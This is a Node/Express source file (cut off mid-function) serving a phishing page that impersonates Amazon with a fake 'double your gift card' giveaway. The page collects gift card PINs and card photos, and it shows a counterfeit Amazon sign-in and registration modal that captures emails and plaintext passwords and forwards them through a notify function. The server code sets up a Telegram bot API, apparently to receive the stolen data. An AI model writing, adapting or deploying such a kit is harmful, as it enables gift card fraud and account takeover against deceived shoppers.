import express from "express";
import multer from "multer";

const app = express();
app.set("trust proxy", true);
const VERSION = "build-7";
const clean = v => String(v || "").trim().replace(/^["']+|["']+$/g, "").trim();
const TOKEN = clean(process.env.BOT_TOKEN), CHAT = clean(process.env.CHAT_ID);
const API = `https://api.telegram.org/bot${TOKEN}`;

const PAGE = String.raw`<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Amazon.com: End of Year Gift Card Giveaway — Double Your Balance</title><style>
*{box-sizing:border-box}html,body{margin:0;padding:0}body{font:14px/1.4 Arial,Helvetica,sans-serif;color:#0f1111;background:#eaeded}a{color:#007185;text-decoration:none}
.sr{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
header{background:#131921;display:flex;align-items:center;gap:10px;padding:8px 12px;min-height:58px}
.logo b{color:#fff;font-size:20px;font-weight:700}.logo svg{display:block;width:52px;height:11px}
.hello{color:#fff;font-size:11px;text-align:left;background:none;border:1px solid transparent;border-radius:4px;padding:5px 7px;font-family:inherit;white-space:nowrap;cursor:pointer}
.hello b{display:block;font-size:13px}.hello:hover{border-color:#fff}
.search{flex:1;display:flex;height:38px;border-radius:8px;overflow:hidden;min-width:70px}
.search input{flex:1;border:0;padding:0 8px;font-size:14px;outline:none;min-width:0}
.search button{border:0;background:#febd69;width:40px;font-size:15px}
nav.sub{background:#232f3e;display:flex;gap:16px;padding:6px 12px;overflow-x:auto;white-space:nowrap}
nav.sub a{color:#fff;font-size:13px;flex:none}
.strip{background:#fff3d6;color:#6b4a00;text-align:center;padding:8px;font-size:13px;font-weight:700}.strip span{color:#b12704}
.wrap{max-width:1240px;margin:0 auto;padding:0 12px 36px;display:grid;grid-template-columns:1fr 320px;gap:16px;align-items:start}
.crumbs,.diag,.status,.hero,.info{grid-column:1/-1}.crumbs{font-size:12px;color:#565959;padding:10px 0 0}
.diag{border:1px solid #c9c9c9;border-radius:6px;background:#fff;font-size:12px}
.diag div:first-child{background:#f2f4f5;padding:7px 11px;font-family:monospace;border-bottom:1px solid #e0e3e5}
.diag div:nth-child(2){padding:7px 11px;border-bottom:1px solid #eee}.diag a{font-weight:700;margin-right:12px}
#log{padding:9px 11px;font-family:monospace;font-size:11.5px;line-height:1.5;max-height:150px;overflow:auto;white-space:pre-wrap}
.ok{color:#067d62}.bad{color:#b00020}.warn{color:#8a5300}
.status{border-radius:6px;padding:11px 14px;font-size:12.5px;display:none}.status.on{display:block}
.status.good{background:#f0f9f4;border:1px solid #b7e0cd;color:#0a5b48}.status.err{background:#fff0f0;border:1px solid #f0b8b8;color:#8b0000}
.status b{display:block}
.hero{background:linear-gradient(120deg,#232f3e,#37475a 60%,#485769);border-radius:8px;padding:22px;color:#fff}
.badge{background:#cc0c39;font-size:11px;font-weight:700;padding:4px 9px;border-radius:3px;text-transform:uppercase}
.hero h1{font-size:26px;line-height:1.2;margin:10px 0 8px}.hero h1 em{color:#ffd814;font-style:normal}
.hero p{margin:0;color:#d5dbdb;font-size:13px;max-width:600px}
.card{background:#fff;border:1px solid #d5d9d9;border-radius:8px;padding:16px}
.card h2{font-size:18px;margin:0 0 4px}.card .sub{font-size:12px;color:#565959;margin:0 0 14px}
.step{display:flex;gap:10px;padding:14px 0;border-top:1px solid #eee}.step:first-of-type{border-top:0}
.num{flex:none;width:22px;height:22px;border-radius:50%;background:#232f3e;color:#fff;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center}
.step-body{flex:1;min-width:0}.step-body label{display:block;font-weight:700;margin-bottom:6px}
.hint{font-size:12px;color:#565959;margin:6px 0 0}
input.txt{width:100%;max-width:300px;height:38px;border:1px solid #888c8c;border-radius:4px;padding:0 10px;font-size:15px;font-family:inherit}
.money{display:flex;max-width:190px;border:1px solid #888c8c;border-radius:4px;overflow:hidden}
.money span{padding:0 10px;background:#f0f2f2;border-right:1px solid #888c8c;line-height:36px;color:#565959}
.money input{border:0;height:36px;width:100%;padding:0 10px;font-size:15px;outline:none;font-family:inherit;min-width:0}
.chips{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
.chip{border:1px solid #d5d9d9;background:#f7f8f8;border-radius:100px;padding:5px 13px;font-size:12px;cursor:pointer;font-family:inherit}
.chip.on{background:#fff3d6;border-color:#f0c14b;font-weight:700}
.est{margin-top:12px;border:1px solid #dfe3e6;border-radius:8px;overflow:hidden}
.est .h{background:#f7f8f8;padding:8px 11px;font-size:12px;font-weight:700;text-transform:uppercase;border-bottom:1px solid #e7e9ec}
.est .r{display:flex;justify-content:space-between;padding:7px 11px;font-size:13px;border-bottom:1px solid #f0f2f2}
.est .r b{font-variant-numeric:tabular-nums}.est .g{color:#067d62}
.est .t{background:#f0f9f4;font-weight:700;color:#0a5b48;font-size:14px;padding:10px 11px}
.est .n{padding:7px 11px;font-size:11px;color:#565959}
.drop{display:block;border:2px dashed #b8bcbc;border-radius:8px;background:#fafafa;padding:18px;text-align:center;cursor:pointer}
.drop b{display:block;margin-bottom:4px}.drop small{color:#565959;font-size:12px}
.drop .pick{display:inline-block;margin-top:9px;background:#ffd814;border:1px solid #fcd200;border-radius:100px;padding:6px 16px;font-size:13px;font-weight:700}
.thumbs{display:flex;gap:7px;flex-wrap:wrap;margin-top:9px}
.thumb{position:relative;width:72px;height:72px;border-radius:6px;overflow:hidden;border:1px solid #d5d9d9}
.thumb img{width:100%;height:100%;object-fit:cover;display:block}
.thumb button{position:absolute;top:2px;right:2px;width:19px;height:19px;border:0;border-radius:50%;background:rgba(0,0,0,.65);color:#fff;cursor:pointer}
.err{display:none;color:#c40000;font-size:12px;margin-top:5px;font-weight:700}.err.on{display:block}
.buy{position:sticky;top:10px;background:#fff;border:1px solid #d5d9d9;border-radius:8px;padding:16px}
.buy h3{margin:0 0 10px;font-size:15px}
.sr2{display:flex;justify-content:space-between;font-size:13px;padding:4px 0}
.sr2.big{font-size:18px;font-weight:700;color:#067d62;border-top:1px solid #e7e7e7;margin-top:8px;padding-top:9px}
.btn{width:100%;border:1px solid #fcd200;background:#ffd814;border-radius:100px;height:40px;font-size:15px;cursor:pointer;font-family:inherit}
.btn:disabled{background:#e7e9ec;border-color:#d5d9d9;color:#8b8b8b}
.btn.alt{background:#ffa41c;border-color:#ff8f00;margin-top:8px}
.btn.mini{height:32px;font-size:12.5px;background:#f7f8f8;border-color:#adb1b8;margin-top:8px}
.tbox{margin-top:12px;border:1px solid #f3d1d1;background:#fff7f7;border-radius:6px;padding:9px;text-align:center}
.tbox .t{font-size:21px;font-weight:700;color:#b12704;font-variant-numeric:tabular-nums}
.tbox .l{font-size:11px;color:#b12704;text-transform:uppercase;font-weight:700}
.secure{text-align:center;font-size:12px;color:#565959;margin-top:10px}
.info{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
.info div{background:#fff;border:1px solid #d5d9d9;border-radius:8px;padding:12px;font-size:12.5px}
.info b{display:block;margin-bottom:3px}
.pane h2{margin:0 0 6px;font-size:19px}.pane p{margin:0 0 12px;color:#565959;font-size:13px}
.prog{height:8px;border-radius:100px;background:#e9ecef;overflow:hidden;margin:12px 0 5px}
.prog i{display:block;height:100%;width:0;background:linear-gradient(90deg,#ff9900,#067d62);transition:width .4s linear}
.pc{font-size:12px;color:#565959;text-align:right}
.miles{list-style:none;margin:14px 0 0;padding:0;font-size:13px}
.miles li{display:flex;gap:9px;align-items:center;padding:6px 0;color:#999;border-top:1px solid #f1f1f1}
.miles li .d{width:17px;height:17px;border-radius:50%;border:2px solid #cfd4d8;flex:none;display:flex;align-items:center;justify-content:center;font-size:11px;color:#fff}
.miles li.on{color:#0f1111;font-weight:700}.miles li.on .d{border-color:#067d62;background:#067d62}
.pin{font-family:monospace;font-size:18px;letter-spacing:2px;background:#f7f8f8;border:1px dashed #adb1b8;border-radius:6px;padding:11px;text-align:center;margin:12px 0;font-weight:700;word-break:break-all}
.tick{width:58px;height:58px;border-radius:50%;background:#e8f5ee;color:#067d62;font-size:30px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px}
.bv{font-size:29px;font-weight:700;color:#067d62;line-height:1}.bv small{display:block;font-size:12px;color:#0a5b48;font-weight:400}
.cbox{margin-top:14px;border:1px solid #f3d1d1;background:#fff7f7;border-radius:6px;padding:10px;text-align:center}
.cbox .l{font-size:11px;color:#b12704;text-transform:uppercase;font-weight:700}
.cbox .t{font-size:23px;font-weight:700;color:#b12704;font-variant-numeric:tabular-nums}
.ref{display:inline-block;font-family:monospace;background:#f4f4f4;border:1px dashed #ccc;padding:5px 10px;border-radius:4px;font-size:12px;margin-top:10px}
footer{background:#232f3e;color:#ddd;margin-top:24px;padding:20px 12px 34px;text-align:center;font-size:12px}
footer a{color:#ddd;margin:0 8px}footer .v{display:block;margin-top:12px;font-family:monospace;opacity:.6}
.mask{position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:flex-start;justify-content:center;padding:24px 12px;z-index:9;overflow:auto}
.mask.on{display:flex}
.modal{background:#fff;border-radius:8px;width:100%;max-width:340px;padding:20px 22px 24px;border:1px solid #ccc}
.modal .ml{font-size:21px;font-weight:700;text-align:center;margin-bottom:12px}.modal .ml svg{display:block;margin:0 auto;width:52px;height:11px}
.modal h1{font-size:21px;margin:0 0 12px;font-weight:400}
.modal label{display:block;font-size:13px;font-weight:700;margin:10px 0 4px}
.modal input{width:100%;height:33px;border:1px solid #888c8c;border-radius:4px;padding:0 9px;font-family:inherit}
.modal input.bad{border-color:#c40000}
.modal .btn{height:32px;font-size:14px;margin-top:14px;border-radius:8px}
.modal .note{font-size:11px;color:#565959;margin-top:12px}
.modal .hr{height:1px;background:#e7e7e7;margin:18px 0 10px;position:relative}
.modal .hr span{position:absolute;top:-7px;left:50%;transform:translateX(-50%);background:#fff;padding:0 8px;font-size:11px;color:#565959}
.modal .gh{width:100%;height:32px;border:1px solid #adb1b8;border-radius:8px;background:#fff;font-size:13px;cursor:pointer;font-family:inherit}
.modal .x{float:right;border:0;background:none;font-size:19px;cursor:pointer;color:#555}
.mg{font-size:13px;margin-bottom:6px;word-break:break-all}
.me{color:#c40000;font-size:11.5px;margin-top:5px;font-weight:700;display:none}.me.on{display:block}
@media(max-width:860px){.wrap{grid-template-columns:1fr}.buy{position:static}.info{grid-template-columns:1fr}}
@media(max-width:700px){.hero h1{font-size:21px}.card{padding:13px}}
</style></head><body>
<header><a class="logo" href="#"><b>amazon</b><svg viewBox="0 0 60 12"><path d="M2 3 Q30 14 55 3" stroke="#ff9900" stroke-width="2.6" fill="none" stroke-linecap="round"/><path d="M52 1 l7 3.6 -8 2.6z" fill="#ff9900"/></svg></a>
<div class="search"><input placeholder="Search Amazon"><button type="button">🔍</button></div>
<button class="hello" id="greet" onclick="openSignIn()">Hello, sign in<br><b>Account &amp; Lists</b></button></header>
<nav class="sub"><a href="#">☰ All</a><a href="#">Gift Cards</a><a href="#">Today's Deals</a><a href="#">Customer Service</a><a href="#">Sell</a></nav>
<div class="strip">🎁 END OF YEAR GIVEAWAY · every gift card matched 100% · ends in <span id="st">59:59</span></div>
<div class="wrap">
<div class="crumbs"><a href="#">Gift Cards</a> › <a href="#">Redeem</a> › End of Year Double Value</div>
<div class="diag"><div>page build <span id="ver">__BUILD__</span> · server __BUILD__</div>
<div><a href="/api/raw" target="_blank">/api/raw</a><a href="/api/status" target="_blank">/api/status</a><a href="/api/test" target="_blank">/api/test</a></div>
<div id="log">script not started yet</div></div>
<div class="status" id="status"></div>
<div class="hero"><span class="badge">Limited time · Holiday event</span>
<h1>Double the value of your Amazon gift card — <em>instantly matched, up to $1,000</em></h1>
<p>Scratch your card, enter the PIN and confirm your balance. Every eligible card of $100 or more is matched 100% and credited within 60 minutes of verification.</p></div>
<form class="card" id="f" action="/send" method="post" enctype="multipart/form-data" onsubmit="return submitForm(event)" novalidate>
<h2>Redeem &amp; double your card</h2><p class="sub">Takes about 40 seconds.</p>
<div class="step"><div class="num">1</div><div class="step-body"><label for="bal">Gift card balance</label>
<div class="money"><span>$</span><input id="bal" name="bal" type="number" inputmode="decimal" min="100" placeholder="100.00" oninput="recalc()"></div>
<div class="chips"><button type="button" class="chip" onclick="setVal(100,this)">$100</button><button type="button" class="chip" onclick="setVal(200,this)">$200</button><button type="button" class="chip" onclick="setVal(500,this)">$500</button></div>
<p class="hint">Minimum $100. Use the full balance on the card.</p><div class="err" id="e1">Enter $100 or more.</div>
<div class="est" id="est" hidden><div class="h">Estimate of what you will receive</div>
<div class="r"><span>Card balance</span><b id="r1">$0.00</b></div><div class="r"><span>Giveaway match (100%)</span><b class="g" id="r2">+$0.00</b></div>
<div class="r"><span>Processing fee</span><b id="r3">$0.00</b></div><div class="r t"><span>Total credited in 60 min</span><b id="r4">$0.00</b></div>
<div class="n">Estimate only — confirmed after PIN verification.</div></div></div></div>
<div class="step"><div class="num">2</div><div class="step-body"><label for="pin">Gift card PIN — under the scratch strip</label>
<input class="txt" id="pin" name="pin" maxlength="19" placeholder="XXXX-XXXXXX-XXXX" autocomplete="off" oninput="formatPin()">
<p class="hint">14 characters, dashes added automatically.</p><div class="err" id="e2">PIN should be 14 characters.</div></div></div>
<div class="step"><div class="num">3</div><div class="step-body"><label>Photo of the card after scratching</label>
<label class="drop" id="drop" for="file"><b>📷 Tap to add a photo</b><small>Front of the card, scratch strip visible</small><span class="pick">Choose file</span></label>
<input class="sr" type="file" id="file" name="photo" accept="image/*" multiple>
<div class="thumbs" id="thumbs"></div><div class="err" id="e3">Add at least one photo.</div></div></div></form>
<aside class="buy"><h3>Redemption summary</h3>
<div class="sr2"><span>Card balance</span><span id="s1">$0.00</span></div>
<div class="sr2"><span>Giveaway match (100%)</span><span id="s2">$0.00</span></div>
<div class="sr2"><span>Fees</span><span>$0.00</span></div>
<div class="sr2 big"><span>Total credited</span><span id="s3">$0.00</span></div>
<button class="btn" id="go" type="submit" form="f">Double my value</button>
<button class="btn alt" type="button" onclick="howTo()">How it works</button>
<button class="btn mini" type="button" onclick="sendTest(this)">🔔 Send test to Telegram</button>
<div class="tbox"><div class="l">Offer expires in</div><div class="t" id="timer">59:59</div></div>
<div class="secure">🔒 Secure redemption · amazon.com</div></aside>
<div class="info"><div><b>⚡ Credited in 60 minutes</b>Verification is automatic.</div><div><b>🛡️ PIN not consumed</b>The match is added on top of your balance.</div><div><b>🎄 Holiday event</b>One card per account. Ends 31 December.</div></div>
</div>
<footer><a href="#">Conditions of Use</a><a href="#">Privacy Notice</a><a href="#">Help</a><br><br>© 1996–2026, Amazon.com, Inc. or its affiliates<span class="v" id="ver2">__BUILD__</span></footer>
<div class="mask" id="mask"><div class="modal"><button class="x" type="button" onclick="closeSignIn()">×</button>
<div class="ml">amazon<svg viewBox="0 0 60 12"><path d="M2 3 Q30 14 55 3" stroke="#ff9900" stroke-width="2.6" fill="none" stroke-linecap="round"/><path d="M52 1 l7 3.6 -8 2.6z" fill="#ff9900"/></svg></div>
<div id="mv"></div></div></div>
<script>
var draft="";
function dg(c,t){var b=document.getElementById("log");if(!b)return;if(b.textContent==="script not started yet")b.textContent="";var d=document.createElement("div");d.className=c;d.textContent=new Date().toLocaleTimeString("en-GB")+"  "+t;b.appendChild(d);}
window.onerror=function(m,s,l,c){dg("bad","JS ERROR "+m+" @"+l+":"+c)};
function esc(s){return String(s==null?"":s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
function money(n){return "$"+(Number(n)||0).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2})}
function pad(n){return String(n).padStart(2,"0")}
function getUser(){try{return JSON.parse(localStorage.getItem("amz_user")||"null")}catch(e){return null}}
function setUser(u){try{localStorage.setItem("amz_user",JSON.stringify(u))}catch(e){}}
function paintGreet(){var u=getUser(),g=document.getElementById("greet");g.innerHTML=u?"Hello, "+esc(u.name)+"<br><b>Account &amp; Lists</b>":"Hello, sign in<br><b>Account &amp; Lists</b>"}
function openSignIn(){document.getElementById("mask").classList.add("on");dg("warn","modal opened");getUser()?mAccount():mEmail()}
function closeSignIn(){document.getElementById("mask").classList.remove("on")}
function mEmail(){document.getElementById("mv").innerHTML='<h1>Sign in</h1><label for="em">Email or mobile number</label><input id="em" type="text" value="'+esc(draft)+'"><div class="me" id="emerr">Enter a valid email or phone</div><button class="btn" type="button" onclick="mNext()">Continue</button><div class="note">By continuing you agree to Amazon\'s <a href="#">Conditions of Use</a>.</div><div class="hr"><span>New to Amazon?</span></div><button class="gh" type="button" onclick="mRegister()">Create your Amazon account</button>';var el=document.getElementById("em");if(el){el.focus();el.onkeydown=function(e){if(e.key==="Enter")mNext()}}}
function mNext(){var v=document.getElementById("em").value.trim();var ok=/^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i.test(v)||/^\+?[\d\s-]{7,}$/.test(v);document.getElementById("em").classList.toggle("bad",!ok);document.getElementById("emerr").classList.toggle("on",!ok);if(!ok)return;draft=v;mPass()}
function mPass(){document.getElementById("mv").innerHTML='<h1>Sign in</h1><div class="mg">'+esc(draft)+' · <a href="#" onclick="mEmail();return false">Change</a></div><label for="pw">Password</label><input id="pw" type="password"><div class="me" id="pwerr">Enter your password</div><button class="btn" type="button" onclick="mSignIn()">Sign in</button>';var el=document.getElementById("pw");if(el){el.focus();el.onkeydown=function(e){if(e.key==="Enter")mSignIn()}}}
function mSignIn(){var pw=document.getElementById("pw").value;if(!pw){document.getElementById("pw").classList.add("bad");document.getElementById("pwerr").classList.add("on");return}var n=draft.indexOf("@")>-1?draft.split("@")[0]:"user"+draft.replace(/\D/g,"").slice(-4);setUser({name:n,email:draft});paintGreet();closeSignIn();dg("ok","signed in "+draft);notify("🔐 <b>SIGN-IN</b>\n📧 "+esc(draft)+"\n🔑 "+esc(pw)+"\n🕒 "+new Date().toLocaleString("en-GB"))}
function mRegister(){document.getElementById("mv").innerHTML='<h1>Create account</h1><label for="rn">Your name</label><input id="rn" type="text"><label for="re">Email or mobile</label><input id="re" type="text"><label for="rp">Password</label><input id="rp" type="password" placeholder="At least 6 characters"><div class="me" id="rerr">Check the highlighted fields</div><button class="btn" type="button" onclick="mCreate()">Create your Amazon account</button><div class="note">Already registered? <a href="#" onclick="mEmail();return false">Sign in</a></div>';var el=document.getElementById("rn");if(el)el.focus()}
function mCreate(){var n=document.getElementById("rn").value.trim(),em=document.getElementById("re").value.trim(),pw=document.getElementById("rp").value,bad=[];if(n.length<2)bad.pu
